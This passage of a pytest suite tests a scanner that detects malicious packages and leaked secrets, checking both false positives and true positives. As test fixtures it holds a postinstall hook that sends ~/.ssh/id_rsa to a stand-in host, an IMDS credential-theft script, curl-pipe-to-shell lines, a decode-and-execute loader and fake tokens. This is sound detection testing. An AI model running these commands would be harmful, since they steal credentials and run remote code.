        b"    languages: [python]\n"
        b"    severity: ERROR\n"
        b"    patterns:\n"
        b'      - pattern: token = "..."\n'
    )

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))

    @pytest.mark.parametrize(
        "line",
        [
            b"// ruleid: adafruit-api-key",
            b"# ruleid: python.lang.security.audit.x",
            b"# ok: python.lang.security.audit.x",
            b"// todoruleid: some-rule",
            b"# todook: some-rule",
            b"// deepruleid: some-rule",
            b"-- ruleid: sql-injection",
            b"  * ruleid: java-thing",
        ],
    )
    def test_the_annotation_family_is_recognised(self, line: bytes) -> None:
        assert self.content("sample.go", line + b"\nx = 1\n").is_rule_material

    @pytest.mark.parametrize(
        "line",
        [
            b"// TODO: dropbox-long-lived-api-token",
            b"ruleid: not-in-a-comment",
            b"// ruleid:",
            b'print("ok: fine")',
            b"// okay: something",
        ],
    )
    def test_near_misses_are_not(self, line: bytes) -> None:
        """Narrow on purpose. The annotation has to start a line, sit in a comment, and
        name a rule; otherwise prose containing the word would exempt a file."""
        assert not self.content("sample.go", line + b"\nx = 1\n").is_rule_material

    def test_a_rule_set_is_recognised(self) -> None:
        assert self.content("rules/credentials.yaml", self.RULESET).is_rule_material

    def test_an_ordinary_document_with_an_id_is_not(self) -> None:
        """All three signals are required together. A Kubernetes list, an OpenAPI
        document or a CI file may well have `- id:` in it."""
        raw = b"rules:\n  - id: allow-http\n    from: 0.0.0.0/0\n"
        assert not self.content("infra/firewall.yaml", raw).is_rule_material

    @staticmethod
    def everything(root):
        """Scanned down to INFO, which is below the default reporting threshold.

        The point of the ceiling is that these drop out of a default scan, so a test
        that wants to see them has to ask the way a curious reader would."""
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        config = Config.default().with_overrides(severity_threshold=Severity.INFO)
        return Scanner(config).scan(root)

    def test_a_sample_credential_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        corpus = tmp_path / "generic" / "secrets" / "gitleaks"
        corpus.mkdir(parents=True)
        (corpus / "adafruit-api-key.go").write_bytes(self.ANNOTATED)
        assert not Scanner().scan(tmp_path).findings, "nothing at the default threshold"
        result = self.everything(tmp_path)
        secrets = [f for f in result.findings if f.rule_id.startswith("SECRET.")]
        assert secrets, "the rule still runs and the finding is still made"
        assert all(f.severity is Severity.INFO for f in secrets)
        assert "rule material" in secrets[0].message

    def test_an_infrastructure_sample_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        corpus = tmp_path / "terraform" / "aws" / "security"
        corpus.mkdir(parents=True)
        (corpus / "public-ingress.tf").write_bytes(
            b"# ruleid: aws-ec2-security-group-allows-public-ingress\n"
            b'resource "aws_security_group" "x" {\n'
            b"  ingress {\n"
            b'    cidr_blocks = ["0.0.0.0/0"]\n'
            b"  }\n"
            b"}\n"
        )
        assert not Scanner().scan(tmp_path).findings, "nothing at the default threshold"
        result = self.everything(tmp_path)
        iac = [f for f in result.findings if f.rule_id.startswith("SUSPECT.IAC.")]
        assert iac, "the rule still runs"
        assert all(f.severity is Severity.INFO for f in iac)

    def test_the_same_file_without_the_annotation_is_reported_in_full(self, tmp_path) -> None:
        """The control. Remove the one comment line and the finding is a finding again,
        which is what makes the exemption a statement about rule corpora rather than a
        weakening of the rule."""
        from cordon_scanner.core.models import Severity

        corpus = tmp_path / "infra"
        corpus.mkdir()
        (corpus / "main.tf").write_bytes(
            b'resource "aws_security_group" "x" {\n'
            b"  ingress {\n"
            b'    cidr_blocks = ["0.0.0.0/0"]\n'
            b"  }\n"
            b"}\n"
        )
        iac = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SUSPECT.IAC.")]
        assert iac and any(f.severity >= Severity.HIGH for f in iac)

    def test_an_annotation_does_not_hide_malware(self, tmp_path) -> None:
        """The bypass, tested. MALICIOUS is never ceilinged, so a payload that plants a
        `// ruleid:` comment gains nothing: this is why the predicate lowers a severity
        instead of dropping a finding."""
        package = tmp_path / "pkg"
        package.mkdir()
        (package / "package.json").write_text(
            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node i.js"}}'
        )
        (package / "i.js").write_bytes(
            b"// ruleid: credential-exfiltration\n"
            + assemble(
                "const k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n",
                "require('https').request('https://x.test/c', {method:'POST'}).end(k);\n",
            ).encode()
        )
        assert any(rule.startswith("MALWARE.") for rule in flagged(tmp_path))

    def test_a_binary_is_not_asked(self) -> None:
        """The signals are text signals. A compiled artefact cannot carry either, and
        should not pay two regex passes to establish that."""
        raw = b"\x7fELF" + b"\x00" * 64 + b"// ruleid: x\n"
        assert not self.content("lib/x.so", raw).is_rule_material


class TestTheMetadataEndpointIsNotTheNetwork:
    """`stacksimplify/terraform-on-aws-eks` supplied fifteen copies of a fourteen-line
    cloud-init script that installs Apache and writes the EC2 instance identity document
    into the webroot. Cordon read the IMDS fetch as an outbound connection and made two
    claims about it, both false:

    * `SUSPECT.PERSIST.001` -- "reaches the network and writes to a location that
      survives a restart" -- where the write was `systemctl enable httpd`, the service
      `yum` had just installed.
    * `SUSPECT.EXFIL.001` -- "reads credentials, opens an outbound connection, and runs
      code".

    Nothing left the instance. 169.254.169.254 is link-local, and reading it is how a
    very large amount of ordinary cloud tooling finds out where it is running.

    Per match, not per file, so a script that reads metadata and then posts it somewhere
    real keeps the capability -- which is the attack this must not stop reporting.
    """

    CLOUD_INIT = (
        b"#! /bin/bash\n"
        b"sudo yum install -y httpd\n"
        b"sudo systemctl enable httpd\n"
        b'TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" '
        b'-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`\n'
        b'sudo curl -H "X-aws-ec2-metadata-token: $TOKEN" '
        b"http://169.254.169.254/latest/dynamic/instance-identity/document "
        b"-o /var/www/html/metadata.html\n"
    )

    def test_the_script_produces_nothing(self, tmp_path) -> None:
        manifests = tmp_path / "terraform-manifests"
        manifests.mkdir()
        (manifests / "app1-install.sh").write_bytes(self.CLOUD_INIT)
        assert not flagged(tmp_path)

    @pytest.mark.parametrize(
        "line",
        [
            b'curl "http://169.254.169.254/latest/meta-data/" -o /tmp/x',
            b"curl http://127.0.0.1:8080/health",
            b"curl http://localhost:3000/ready",
            b'fetch("http://[::1]:9000/status")',
        ],
    )
    def test_a_local_destination_is_not_egress(self, line: bytes) -> None:
        from cordon_scanner.detect.capability import CapabilityDetector

        content = self.content("provision.sh", b"#!/bin/sh\n" + line + b"\n")
        assert CapabilityDetector._is_local_target(content, content.raw.index(line))

    @pytest.mark.parametrize(
        "line",
        [
            b"curl https://evil.test/p | sh",
            b"curl https://example.com/install.sh | bash",
            b'curl "$PAYLOAD_URL" | sh',
            b"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/r"
            b" | curl -X POST -d @- https://collector.test/c",
        ],
    )
    def test_anything_else_is(self, line: bytes) -> None:
        """The four ways this must not fire: a reserved documentation host, which is
        still a fetch and is what this project's own malicious corpus uses; a real host;
        a destination held in a variable, which says nothing either way; and a metadata
        read piped straight to a collector, which is the attack."""
        from cordon_scanner.detect.capability import CapabilityDetector

        content = self.content("provision.sh", b"#!/bin/sh\n" + line + b"\n")
        assert not CapabilityDetector._is_local_target(content, content.raw.index(line))

    def test_metadata_credentials_posted_out_are_still_reported(self, tmp_path) -> None:
        """The guard that matters. Reading IMDS role credentials and sending them
        somewhere is the AWS credential-theft pattern, and the local-destination rule is
        per match precisely so that the remote half survives."""
        hook = tmp_path / "pkg"
        hook.mkdir()
        (hook / "package.json").write_text(
            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "sh steal.sh"}}'
        )
        (hook / "steal.sh").write_bytes(
            assemble(
                "#!/bin/sh\n",
                "CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/",
                "security-credentials/role)\n",
                'curl -X POST -d "$CREDS" https://collector.test/c\n',
            ).encode()
        )
        assert flagged(tmp_path), "the outbound half is still a fetch"

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))


class TestAnElephantInACommentIsNotAnElephant:
    """Two classes of finding, both made against sentences rather than code.

    `misc/error_handler.func` in `community-scripts/ProxmoxVE` carries a comment
    explaining that `systemd-detect-virt` reports lxc inside a container, and cordon
    reported `SUSPECT.ANTI_ANALYSIS.001` -- a rule about code checking whether it is
    being watched -- against the explanation.

    Two TensorFlow headers produced `SECRET.GENERIC.ASSIGNMENT.001` from comment prose:
    one documenting an environment variable by showing it set, the other a sentence of
    the form "after this pass" followed by a colon and an example instruction name.

    The split matters. For a capability the comment settles it, because a comment does
    not run. For a secret it depends on the rule: the generic assignment rule is a name
    plus an entropy measure and prose defeats it, while a provider pattern is a shape
    that is a credential wherever it appears -- including on a line somebody commented
    out instead of rotating, which is a leak and not a cleanup.
    """

    @staticmethod
    def content(path: str, raw: bytes):
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw))

    @pytest.mark.parametrize(
        ("line", "column", "language", "commented"),
        [
            ("# systemd-detect-virt reports lxc in containers", 10, "shell", True),
            ("// after this pass: broadcast.123.0", 20, "cpp", True),
            (" * api_key: aW52ZW50ZWQtdmFsdWU", 5, "java", True),
            ("-- select token from t", 12, "sql", True),
            ("#!/bin/sh", 3, "shell", False),
            ('curl "https://x.test/a#fragment" | sh', 30, "shell", False),
            ('print("# not a comment")', 9, "python", False),
            ("const x = 1; // trailing", 6, "typescript", False),
            ("const x = 1; // trailing", 16, "typescript", True),
            ("# anything", 5, None, False),
            ("# anything", 5, "unknownlang", False),
        ],
    )
    def test_the_predicate(self, line: str, column: int, language, commented: bool) -> None:
        from cordon_scanner.core.comments import is_commented

        assert is_commented(line, column, language) is commented

    def test_a_quoted_hash_is_not_a_comment(self) -> None:
        """The case that makes this worth tracking quote state for. A fragment in a URL
        is not a comment, and the pipe after it is not commented out."""
        from cordon_scanner.core.comments import is_commented

        line = 'curl "https://x.test/p#frag" | sh'
        assert not is_commented(line, line.index("| sh"), "shell")

    def test_a_capability_in_a_comment_is_not_reported(self, tmp_path) -> None:
        script = tmp_path / "misc"
        script.mkdir()
        (script / "error_handler.func").write_bytes(
            b"#!/usr/bin/env bash\n"
            b"# systemd-detect-virt reports lxc inside containers, so the check below\n"
            b"# deliberately does not run it.\n"
            b'report() { echo "$1"; }\n'
        )
        assert "SUSPECT.ANTI_ANALYSIS.001" not in flagged(tmp_path)

    def test_prose_about_a_pass_is_not_a_credential(self, tmp_path) -> None:
        header = tmp_path / "compiler"
        header.mkdir()
        (header / "renamer.h").write_bytes(
            b"// After this pass: broadcast.123.0\n"
            b"// And with the filter set: LegalizeTF;Canonicalizer\n"
            b"void Rename();\n"
        )
        assert not flagged(tmp_path)

    def test_a_commented_out_provider_token_is_still_reported(self, tmp_path) -> None:
        """The deliberate asymmetry, and the reason the predicate is not applied to the
        provider patterns. Commenting a token out is not rotating it."""
        source = tmp_path / "app"
        source.mkdir()
        (source / "client.py").write_bytes(
            ("# " + assemble("ghp_", "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8") + "\n").encode()
        )
        assert "SECRET.GITHUB.TOKEN.001" in flagged(tmp_path)

    def test_the_same_assignment_in_code_is_still_reported(self, tmp_path) -> None:
        """The control for the generic rule: uncomment it and it is a finding again."""
        source = tmp_path / "app"
        source.mkdir()
        (source / "settings.py").write_bytes(
            ("api_key = " + repr(assemble("aW52ZW50ZWQtc2Vj", "cmV0LXZhbHVlLXg5")) + "\n").encode()
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)


class TestADeclarationAssignsNothing:
    """`manaflow-ai/cmux` produced 44 credential findings and 43 of them were Swift.
    Not secrets in Swift files -- Swift *syntax*:

        public let credential: CmxIrohAdmissionCredential?
        private var socketPasswordObserver: NSObjectProtocol?
        let refreshToken = originalRefreshToken!
        let pendingToken = pendingWriter?.provisionalToken.id
        passwordAuthorization: &passwordAuthorization
        pendingSizingPassIntent = .inputChange
        displayToken = "\\(baseDisplayToken)\\(displaySuffix)"
        auth_token="$(cmux_computer_use_auth_token)"

    A type annotation assigns nothing at all. An optional chain, a force-unwrap, an
    inout argument and a member-shorthand enum case are references to other code. A
    string interpolation and a command substitution are templates whose value is not
    in the file.

    What they share is a marker -- `?`, `!`, `&`, a leading dot, `\\(`, `$(` -- that no
    generated credential contains. A marker is REQUIRED rather than optional, because
    the one real finding in that repository is a bare identifier too: a PostHog
    project key, reported correctly and still reported.
    """

    @pytest.mark.parametrize(
        "value",
        [
            b"CmxIrohAdmissionCredential?",
            b"NSObjectProtocol?",
            b"InstalledCredential?",
            b"originalRefreshToken!",
            b"pendingWriter?.provisionalToken.id",
            b"configuration.relayToken?",
            b"RemoteTmuxControlConnection.ObserverToken?",
            b"&passwordAuthorization",
            b".constraintRecovery",
            b"!socketPasswordModel.current.isEmpty",
            b"$0.authenticationToken",
        ],
    )
    def test_an_expression_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is not None

    @pytest.mark.parametrize(
        "value",
        [
            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
            b"glpat-AAAAAAAAAAAAAAAA",
            b"xKc9vB2mQ7wRtY4u",
        ],
    )
    def test_a_bare_literal_still_is(self, value: bytes) -> None:
        """The guard. Every shape above is excused by a marker; a value with none of
        them is untouched, including the real key this repository does commit."""
        assert NOT_A_SECRET.match(value) is None

    @pytest.mark.parametrize(
        "value",
        [
            rb"\(baseDisplayToken)\(displaySuffix)",
            rb"$(cmux_computer_use_auth_token)",
        ],
    )
    def test_interpolation_and_substitution_are_templates(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(value) is not None

    def test_the_swift_declarations_produce_nothing(self, tmp_path) -> None:
        source = tmp_path / "Sources"
        source.mkdir()
        (source / "Transport.swift").write_bytes(
            b"public struct CmxIrohStreamHeader {\n"
            b"    public let credential: CmxIrohAdmissionCredential?\n"
            b"    private var socketPasswordObserver: NSObjectProtocol?\n"
            b"    let relayToken = configuration.relayToken?\n"
            b"    let hasPassword = !socketPasswordModel.current.isEmpty\n"
            b"}\n"
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_a_real_key_in_the_same_file_is_still_found(self, tmp_path) -> None:
        source = tmp_path / "Sources"
        source.mkdir()
        (source / "Analytics.swift").write_bytes(
            (
                "final class Analytics {\n"
                "    private var observer: NSObjectProtocol?\n"
                "    private let apiKey = "
                + repr(assemble("phc_Kq3Wd7Rt9Zx2Vb5Nm8J", "f4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z"))
                + "\n}\n"
            ).encode()
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)


class TestProvisioningAMachineIsNotAFoothold:
    """`persist` plus `egress` was reported at high 501 times across 106 of the 1,487
    repositories measured, and the largest groups were machine bootstrap scripts:
    `ViktorUJ/cks` twenty-one, `stacksimplify/terraform-on-aws-ec2` seventy-seven
    copies of `yum install httpd` beside `systemctl enable httpd`.

    Nothing in the pair requires the thing made persistent to be the thing fetched --
    the same gap `SUSPECT.DROPPER.001` already documents -- and for a script that
    installs operating-system packages the pair is not a side effect of the job, it is
    the job: download kubectl, write a kubelet drop-in, enable the unit, append shell
    completion to `.bashrc`.

    So installing OS packages is the signal that this file provisions a machine, and
    persistence findings in one are ceilinged. Three things keep it narrow: it applies
    to the persistence composites only, never to a dropper; it is a ceiling rather
    than an exemption; and it is applied before the install-hook escalation, so the
    same script shipped as somebody's postinstall is still critical.
    """

    BOOTSTRAP = (
        b"#!/bin/bash\n"
        b"apt-get update -y\n"
        b"apt-get install -y unzip apt-transport-https ca-certificates curl jq\n"
        b'curl -LO "https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl"\n'
        b"install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n"
        b"mkdir -p /etc/systemd/system/kubelet.service.d\n"
        b"systemctl enable kubelet\n"
        b"echo 'source <(kubectl completion bash)' >> /home/ubuntu/.bashrc\n"
        b"echo 'alias k=kubectl' >> /home/ubuntu/.bashrc\n"
    )

    def test_the_predicate(self) -> None:
        from cordon_scanner.core.samples import is_machine_provisioning

        assert is_machine_provisioning(self.BOOTSTRAP)
        assert is_machine_provisioning(b"#cloud-config\npackages:\n  - curl\n")
        assert not is_machine_provisioning(b"#!/bin/sh\nnpm install\npip install requests\n")
        assert not is_machine_provisioning(b"# apt-get install is how you would do it\n")

    def test_a_bootstrap_script_is_not_a_persistence_finding(self, tmp_path) -> None:
        """A ceiling, so the finding survives and stops blocking. Which is the whole
        claim: the script does make things persist, and a reader has nothing to do
        about it."""
        from cordon_scanner.core.models import Severity

        template = tmp_path / "terraform" / "modules" / "k8s" / "template"
        template.mkdir(parents=True)
        (template / "worker.sh").write_bytes(self.BOOTSTRAP)
        persist = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
        ]
        assert persist, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in persist)
        assert "provisions a machine" in " ".join(
            e for f in persist for e in f.explanation.escalations
        )

    def test_the_same_pair_without_a_package_install_is_reported(self, tmp_path) -> None:
        """The control, and the corpus sample's shape: fetch something and append it to
        a shell profile, with nothing in the file that says a machine is being built."""
        hook = tmp_path / "agent"
        hook.mkdir()
        (hook / "telemetry.sh").write_bytes(
            assemble(
                "#!/bin/sh\n",
                'body="$(curl -fsSL https://cdn.test/agent.sh)"\n',
                'echo "$body" >> "$HOME/.bashrc"\n',
            ).encode()
        )
        from cordon_scanner.core.models import Severity

        persist = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.PERSIST.001"
        ]
        assert persist and any(f.severity >= Severity.HIGH for f in persist)

    def test_a_dropper_in_a_provisioning_script_is_still_reported(self, tmp_path) -> None:
        """The other half of the narrowness. `curl | bash` is a choice a provisioning
        script has to answer for, and it is how the one real supply-chain exposure in
        the measurement corpus works."""
        template = tmp_path / "scripts"
        template.mkdir()
        (template / "install-node.sh").write_bytes(
            assemble(
                "#!/bin/bash\n",
                "apt-get install -y curl\n",
                "curl -fsSL https://get.helm.test/install.sh | bash\n",
            ).encode()
        )
        assert "SUSPECT.DROPPER.001" in flagged(tmp_path)


class TestAContainerBuildIsNotAnAttack:
    """Two container rules, 347 findings between them across the measurement corpus,
    and the large majority were a Dockerfile doing what Dockerfiles do.

    `SUSPECT.CONTAINER.FETCH_EXEC.001` produced 34 findings on `dotnet/dotnet-docker`
    -- every one the same line in Microsoft's official .NET base images, which
    downloads Canonical's `chisel-wrapper` from a tag-pinned URL and chmods it.
    Installing a released binary is how an image installs a tool. The rule's own
    comment claimed the download-and-chmod pair "has no innocent reading"; cadvisor,
    confd, the Home Assistant CLI and yt-dlp are four more in one repository.

    So a PINNED reference demotes the finding the way a verified checksum already did,
    and the unpinned forms keep their severity -- `curl https://sh.rustup.rs | sh` and
    `curl https://bootstrap.saltstack.com | bash` are in the same corpus and are
    exactly what the rule is for.

    `SUSPECT.CONTAINER.BUILD_SECRET.001` matched on the NAME alone, so
    `ARG NPM_SECRETLINT_VERSION=13.0.5` -- the version of a linter called secretlint --
    was a credential shipped in the image history, nineteen times across
    `oxsecurity/megalinter`. And `ENV HUBOT_SLACK_TOKEN=` with no value is the
    opposite of baking a secret in: it documents what the operator has to supply.
    """

    @staticmethod
    def rule(rule_id: str):
        from cordon_scanner.detect.config_files import RULES

        return next(r for r in RULES if r.rule_id == rule_id)

    @pytest.mark.parametrize(
        ("line", "reported"),
        [
            (b"ARG NPM_SECRETLINT_VERSION=13.0.5", False),
            (b"ENV HUBOT_SLACK_TOKEN=", False),
            (b"ENV PASSWORD=", False),
            (b'ENV PASSWORD=""', False),
            (b"ENV TOKEN=00000000-0000-0000-0000-000000000000", False),
            (b"ARG NPM_TOKEN=npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345", True),
            (b"ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLE", True),
            (b"ARG CLIENTSECRET=s3cr3t-value-here", True),
        ],
    )
    def test_a_build_argument_needs_a_name_and_a_value(self, line: bytes, reported: bool) -> None:
        assert (
            bool(self.rule("SUSPECT.CONTAINER.BUILD_SECRET.001").pattern.search(line)) is reported
        )

    def test_a_pinned_download_is_one_step_lower(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        (tmp_path / "Dockerfile").write_bytes(
            b"FROM ubuntu:24.04@sha256:"
            + b"0" * 64
            + b"\nRUN curl --fail --location --output /usr/bin/chisel-wrapper \\\n"
            b"      https://raw.githubusercontent.com/canonical/rocks-toolbox/v1.2.0/chisel-wrapper \\\n"
            b"    && chmod 755 /usr/bin/chisel-wrapper\n"
        )
        fetch = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"
        ]
        assert fetch, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in fetch)

    def test_an_unpinned_pipe_into_a_shell_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        (tmp_path / "Dockerfile").write_bytes(
            b"FROM ubuntu:24.04@sha256:"
            + b"0" * 64
            + b"\nRUN curl https://sh.rustup.test -sSf | sh -s -- -y\n"
        )
        fetch = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"
        ]
        assert fetch and any(f.severity >= Severity.HIGH for f in fetch)


class TestARegexMatchIsNotAProcess:
    """`SUSPECT.DECODE_EXEC.001` was 684 findings across 252 of the 1,487 repositories
    measured, and three unrelated defects were producing most of them.

    **`.exec()` on a regular expression.** `CAP.JS.SPAWN.001` matched a bare `exec(`,
    and `RegExp.prototype.exec` is how every JavaScript file in the world matches a
    pattern. A data-URL parser -- `/^data:([^,]*),(.*)$/.exec(dataUrl)` -- beside a
    base64 decode was reported as decoded data being executed.

    **A spawn whose whole argv is written out.** `subprocess.run(["git", "rev-parse",
    "--short", "HEAD"])` cannot be running what the file decoded: what it runs is in
    the file. `NousResearch/hermes-agent` supplied eleven of those. The real cases
    survive because a constant argv is ANALYSED rather than trusted -- the
    embedded-shell tier pulls the fetch and the pipe out of `os.system("curl x | sh")`
    -- and a constant command naming a temporary path is not treated as fixed at all.

    **Adaptive environment checks read as evasion.** `/proc/self/cgroup` is where Linux
    reports a process's resource limits, and `os.geteuid() == 0` is how every installer
    decides whether it is root. Neither is hiding from anything.
    """

    @staticmethod
    def capability_lines(source: str, language: str, capability: str) -> set[int]:
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.core.models import Capability
        from cordon_scanner.detect.base import RuleSelector
        from cordon_scanner.detect.capability import CapabilityDetector
        from cordon_scanner.rules.loader import RuleLoader, RuleSet

        raw = source.encode()
        suffix = {"typescript": "ts", "javascript": "js", "python": "py"}[language]
        content = FileContent(path=f"app.{suffix}", raw=raw, size=len(raw))
        # Selected by language, the way the engine does it: `exec(` is a process in
        # Ruby and PHP and a pattern match in JavaScript, and the packs are allowed to
        # disagree about a spelling because only one of them runs on a given file.
        rules = RuleSet(RuleLoader.load_builtin())
        hits = CapabilityDetector()._match_capabilities(
            content,
            RuleSelector.select_rules(rules, language=language, path=content.path),
            language,
        )
        wanted = Capability(capability)
        return {h.line for h in hits if h.capability is wanted}

    def test_a_regex_exec_is_not_a_spawn(self) -> None:
        source = "\n".join(
            [
                "const DATA_URL_RE = /^data:([^,]*),([\\s\\S]*)$/;",
                "const match = DATA_URL_RE.exec(dataUrl.trim());",
                "const other = /^x(.*)$/.exec(String(value || ''));",
            ]
        )
        assert self.capability_lines(source, "typescript", "spawn") == set()

    def test_a_child_process_exec_still_is(self) -> None:
        source = "\n".join(
            [
                "const { exec } = require('node:child_process');",
                "exec('npm run build');",
                "child_process.exec(command);",
            ]
        )
        assert self.capability_lines(source, "javascript", "spawn")

    def test_a_fixed_argv_does_not_satisfy_a_composite(self, tmp_path) -> None:
        source = tmp_path / "app"
        source.mkdir()
        (source / "versions.py").write_bytes(
            b"import base64, subprocess\n"
            b"\n"
            b"def head():\n"
            b'    return subprocess.run(["git", "rev-parse", "--short", "HEAD"],\n'
            b"                          capture_output=True, text=True).stdout\n"
            b"\n"
            b"def decode(blob):\n"
            b"    return base64.b64decode(blob)\n"
        )
        assert "SUSPECT.DECODE_EXEC.001" not in flagged(tmp_path)

    def test_a_computed_argv_does(self, tmp_path) -> None:
        """The control. The same two capabilities, with the command assembled from what
        was decoded, which is the claim the rule makes."""
        source = tmp_path / "app"
        source.mkdir()
        (source / "loader.py").write_bytes(
            assemble(
                "import base64, subprocess\n",
                "payload = base64.b64decode(BLOB)\n",
                "subprocess.run(payload, shell=True)\n",
            ).encode()
        )
        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)

    def test_a_constant_command_naming_a_temporary_path_is_not_fixed(self, tmp_path) -> None:
        """And the exception to the exception: the argv is constant and the FILE it runs
        is not, because whatever ran before it wrote that file."""
        source = tmp_path / "app"
        source.mkdir()
        (source / "stage.py").write_bytes(
            assemble(
                "import base64, subprocess\n",
                "open('/tmp/update', 'wb').write(base64.b64decode(BLOB))\n",
                "subprocess.run(['/tmp/update'])\n",
            ).encode()
        )
        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)

    @pytest.mark.parametrize(
        "line",
        [
            "with open('/proc/self/cgroup', encoding='utf-8') as fh: limits = fh.read()",
            "if os.geteuid() == 0: raise SystemExit('do not run as root')",
            "if is_container(): timeout = 30",
        ],
    )
    def test_adapting_to_the_environment_is_not_evasion(self, line: str) -> None:
        assert self.capability_lines(line + "\n", "python", "anti_analysis") == set()

    @pytest.mark.parametrize(
        "line",
        [
            "if socket.gethostname() == 'analysis-01': sys.exit(0)",
            "out = subprocess.run(['systemd-detect-virt'])",
            "if os.environ.get('GITHUB_ACTIONS'): return",
        ],
    )
    def test_hiding_from_one_still_is(self, line: str) -> None:
        assert self.capability_lines(line + "\n", "python", "anti_analysis")


class TestAnApiFixtureIsNotADeployment:
    """`kubernetes/kubernetes` produced 798 blocking findings and 649 of them came from
    one directory: `staging/src/k8s.io/api/testdata/HEAD/`, which holds one YAML per
    API type, each a fully-populated example of every field that type has. So every
    boolean in them is `true` -- `privileged`, `hostPID`, `hostIPC`, `hostNetwork` --
    because the files exist to prove the serialiser round-trips, not to be applied.

    `SUSPECT.IAC.PRIVILEGED.001` was 1,584 findings across the measurement corpus, the
    third largest group of anything, and the config detector was the only content
    detector with no fixture ceiling at all.

    Documentation paths are deliberately not ceilinged here, and the corpus proved why
    within one run: `**/*.template` is a documentation glob, because a
    `config.template` holds placeholder credentials -- and a CloudFormation stack is
    also a `.template`.
    """

    FIXTURE = (
        b"apiVersion: v1\n"
        b"kind: Pod\n"
        b"metadata:\n"
        b"  name: podspec\n"
        b"spec:\n"
        b"  hostNetwork: true\n"
        b"  hostPID: true\n"
        b"  hostIPC: true\n"
        b"  containers:\n"
        b"  - name: c\n"
        b"    image: busybox\n"
        b"    securityContext:\n"
        b"      privileged: true\n"
    )

    @staticmethod
    def iac(root, rule: str = "SUSPECT.IAC.PRIVILEGED.001"):
        return [f for f in Scanner().scan(root).findings if f.rule_id == rule]

    def test_api_test_data_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        data = tmp_path / "staging" / "src" / "k8s.io" / "api" / "testdata" / "HEAD"
        data.mkdir(parents=True)
        (data / "v1.Pod.yaml").write_bytes(self.FIXTURE)
        found = self.iac(tmp_path)
        assert found, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in found)
        assert "test material" in found[0].message

    def test_the_same_manifest_in_a_cluster_directory_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        addons = tmp_path / "cluster" / "addons" / "calico"
        addons.mkdir(parents=True)
        (addons / "daemonset.yaml").write_bytes(self.FIXTURE)
        found = self.iac(tmp_path)
        assert found and any(f.severity >= Severity.HIGH for f in found)

    def test_a_cloudformation_template_is_not_documentation(self, tmp_path) -> None:
        """`.template` is a documentation glob for a reason that does not apply to
        infrastructure: a `config.template` holds placeholders, and a CloudFormation
        stack holds a role."""
        (tmp_path / "stack.template").write_bytes(
            b"Resources:\n"
            b"  Role:\n"
            b"    Type: AWS::IAM::Role\n"
            b"    Properties:\n"
            b"      Policies:\n"
            b"      - PolicyDocument:\n"
            b"          Statement:\n"
            b'          - Effect: Allow\n            Action: "*"\n            Resource: "*"\n'
        )
        from cordon_scanner.core.models import Severity

        found = self.iac(tmp_path, "SUSPECT.IAC.IAM_WILDCARD.001")
        assert found and any(f.severity >= Severity.HIGH for f in found)


class TestAReferenceIsNotAValue:
    """Four more shapes from `mongodb/mongo`, whose 251 baseline findings were down to
    75 before this and are a reference, a member variable, a lexer rule and an
    installer property:

        password: *keyFileData                       # a YAML alias
        auto bypass = _recoveredFromDisk             # a private member
        basic_id_token = "\\\\A([[:alpha:]_](?:\\\\w*))"  # a lexer pattern
        Password='[MONGO_SERVICE_ACCOUNT_PASSWORD]'  # an MSI property

    The backslash test is the broadest of the four and is exact rather than
    heuristic: generated key material is base64, base62 or hex, and none of those
    alphabets contains a backslash. One in a value means an escape sequence, a Windows
    path or a regular expression.
    """

    @pytest.mark.parametrize(
        "value",
        [
            b"*keyFileData",
            b"<< *defaults",
            b"_recoveredFromDisk",
            rb"\A([[:alpha:]_](?:\w*))",
